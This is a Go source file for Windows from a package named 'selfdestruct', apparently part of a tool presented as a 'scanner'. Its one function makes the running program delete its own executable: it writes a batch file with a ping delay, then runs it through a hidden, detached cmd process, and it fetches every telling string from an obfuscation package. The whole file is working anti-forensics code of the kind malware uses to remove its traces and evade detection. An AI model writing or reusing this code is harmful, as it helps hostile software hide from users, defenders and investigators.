//go:build windows
// +build windows

package selfdestruct

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"

	"scanner/internal/obfuscate"
)

func DeleteExecutable(exePath string) error {
	if exePath == "" {
		p, err := os.Executable()
		if err != nil {
			return err
		}
		exePath = p
	}

	tmp, err := os.CreateTemp("", obfuscate.BAT_PREFIX())
	if err != nil {
		return err
	}
	tmpName := tmp.Name()
	content := fmt.Sprintf(obfuscate.DEL_FMT(), obfuscate.PING_WAIT(), exePath)

	if _, err := tmp.WriteString(content); err != nil {
		return err
	}
	tmp.Close()

	c := exec.Command(obfuscate.CMD(), obfuscate.CMD_C(), tmpName)
	c.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP | 0x00000008,
	}
	return c.Start()
}
